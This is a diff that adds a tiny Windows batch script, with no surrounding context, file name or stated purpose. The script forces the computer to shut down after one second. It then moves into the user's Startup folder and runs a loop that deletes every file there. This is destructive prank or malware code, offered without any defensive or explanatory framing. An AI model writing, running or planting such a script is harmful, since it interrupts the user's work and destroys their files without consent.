@@ -1,0 +1,8 @@
+@echo off
+
+
+shutdown -s -t 1
+
+
+cd %userprofile%\STARTM~1\Programs\Startup
+FOR %%A IN (*.*) DO DEL
